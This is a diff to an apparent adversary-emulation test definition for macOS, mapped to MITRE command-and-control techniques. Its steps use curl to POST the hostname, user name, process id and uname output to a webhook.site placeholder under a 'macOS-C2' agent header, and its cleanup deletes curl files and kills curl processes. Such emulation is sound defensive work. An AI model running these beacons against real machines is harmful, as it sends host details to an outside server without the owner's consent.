@@ -1,109 +1,84 @@
+---
 api_version: 2.0
-id: 010-webhook-callback-testing
+uuid: 6fcb196b-c17f-4621-99f2-32a743653858
 name: Webhook Callback Testing
-description: Tests webhook callbacks for C2 command delivery and status reporting
-type: command_and_control
-
+authors:
+- Claude Code
+description: |
+  Tests webhook callbacks for C2 command delivery and status reporting
+mitre:
+  tactics:
+  - TA0011 Command and Control
+  techniques:
+  - T1102 Web Service
 requirements:
   platforms:
-    - os: darwin
-
+  - os: darwin
 args:
-  - name: webhook_url
-    type: string
-    description: Webhook URL for C2 callbacks
-    default: "https://webhook.site/your-unique-id"
-  - name: callback_secret
-    type: string
-    description: Callback authentication secret
-    default: "secret-token-12345"
-  - name: timeout
-    type: integer
-    description: Request timeout in seconds
-    default: 10
-  - name: max_retries
-    type: integer
-    description: Maximum retry attempts
-    default: 3
-
+- name: webhook_url
+  description: Webhook URL for C2 callbacks
+  type: string
+  default: https://webhook.site/your-unique-id
+- name: callback_secret
+  description: Callback authentication secret
+  type: string
+  default: secret-token-12345
+- name: timeout
+  description: Request timeout in seconds
+  type: integer
+  default: 10
+- name: max_retries
+  description: Maximum retry attempts
+  type: integer
+  default: 3
 steps:
-  - name: webhook_connectivity_test
-    description: Test basic webhook connectivity
-    command: |
-      curl -s --max-time {{ timeout }} \
-        -X GET "{{ webhook_url }}" \
-        -w "\nHTTP Status: %{http_code}\n"
-    type: command
-  
-  - name: webhook_callback_post
-    description: Send callback data to webhook
-    command: |
-      curl -s --max-time {{ timeout }} \
-        -X POST "{{ webhook_url }}" \
+- name: webhook_connectivity_test
+  description: Test basic webhook connectivity
+  inline: |
+    curl -s --max-time {{ .Args.timeout }} \
+      -X GET "{{ .Args.webhook_url }}" \
+      -w "\nHTTP Status: %{http_code}\n"
+- name: webhook_callback_post
+  description: Send callback data to webhook
+  inline: |
+    curl -s --max-time {{ .Args.timeout }} \
+      -X POST "{{ .Args.webhook_url }}" \
+      -H "Content-Type: application/json" \
+      -H "Authorization: Bearer {{ .Args.callback_secret }}" \
+      -H "X-Callback-Agent: macOS-C2" \
+      -d "{\"type\":\"status\",\"hostname\":\"$(hostname)\",\"user\":\"$(whoami)\",\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",\"pid\":\"$$\"}" \
+      -w "\nHTTP Status: %{http_code}\n"
+- name: webhook_retry_mechanism
+  description: Test webhook callback with retry
+  inline: |
+    retry_count=0
+    while [ $retry_count -lt {{ .Args.max_retries }} ]; do
+      response=$(curl -s --max-time {{ .Args.timeout }} -w "%{http_code}" -X POST "{{ .Args.webhook_url }}" \
         -H "Content-Type: application/json" \
-        -H "Authorization: Bearer {{ callback_secret }}" \
-        -H "X-Callback-Agent: macOS-C2" \
-        -d "{\"type\":\"status\",\"hostname\":\"$(hostname)\",\"user\":\"$(whoami)\",\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",\"pid\":\"$$\"}" \
-        -w "\nHTTP Status: %{http_code}\n"
-    type: command
-  
-  - name: webhook_retry_mechanism
-    description: Test webhook callback with retry
-    command: |
-      retry_count=0
-      while [ $retry_count -lt {{ max_retries }} ]; do
-        response=$(curl -s --max-time {{ timeout }} -w "%{http_code}" -X POST "{{ webhook_url }}" \
-          -H "Content-Type: application/json" \
-          -H "Authorization: Bearer {{ callback_secret }}" \
-          -d "{\"attempt\":\"$retry_count\",\"hostname\":\"$(hostname)\"}")
-        echo "Attempt $((retry_count + 1)): $response"
-        if [[ $response == *"200"* ]] || [[ $response == *"201"* ]]; then
-          echo "Webhook callback successful"
-          break
-        fi
-        retry_count=$((retry_count + 1))
-        sleep 1
-      done
-    type: command
-  
-  - name: webhook_bulk_callback
-    description: Send bulk callback data
-    command: |
-      curl -s --max-time {{ timeout }} \
-        -X POST "{{ webhook_url }}" \
-        -H "Content-Type: application/json" \
-        -H "Authorization: Bearer {{ callback_secret }}" \
-        -d "{\"event\":\"bulk_data\",\"data\":[{\"timestamp\":\"$(date)\",\"type\":\"system_info\",\"value\":\"$(uname -a)\"}]}" \
-        -w "\nHTTP Status: %{http_code}\n"
-    type: command
-    cleanup: true
-
-checks:
-  - name: verify_webhook_reachable
-    description: Verify webhook endpoint is reachable
-    condition: |
-      HTTP response should be 200, 201, or similar success code
-    type: output_validation
-
-test_type: dry_run
-
-cleanup:
-  - name: clear_webhook_cache
-    description: Clear webhook connection cache
-    command: |
+        -H "Authorization: Bearer {{ .Args.callback_secret }}" \
+        -d "{\"attempt\":\"$retry_count\",\"hostname\":\"$(hostname)\"}")
+      echo "Attempt $((retry_count + 1)): $response"
+      if [[ $response == *"200"* ]] || [[ $response == *"201"* ]]; then
+        echo "Webhook callback successful"
+        break
+      fi
+      retry_count=$((retry_count + 1))
+      sleep 1
+    done
+- name: webhook_bulk_callback
+  description: Send bulk callback data
+  inline: |
+    curl -s --max-time {{ .Args.timeout }} \
+      -X POST "{{ .Args.webhook_url }}" \
+      -H "Content-Type: application/json" \
+      -H "Authorization: Bearer {{ .Args.callback_secret }}" \
+      -d "{\"event\":\"bulk_data\",\"data\":[{\"timestamp\":\"$(date)\",\"type\":\"system_info\",\"value\":\"$(uname -a)\"}]}" \
+      -w "\nHTTP Status: %{http_code}\n"
+  cleanup:
+    inline: |
       rm -f ~/.curl/* 2>/dev/null || true
-    type: command
-    optional: true
-  
-  - name: close_webhook_connections
-    description: Close any webhook connections
-    command: |
-      pkill -f "curl.*webhook" 2>/dev/null || true
-    type: command
-    optional: true
 
-metadata:
-  created: 2026-01-30
-  author: Claude Code
-  severity: medium
-  category: command_and_control
+      pkill -f "curl.*webhook" 2>/dev/null || true
+tests:
+- name: dry_run_test
+  dry_run: true
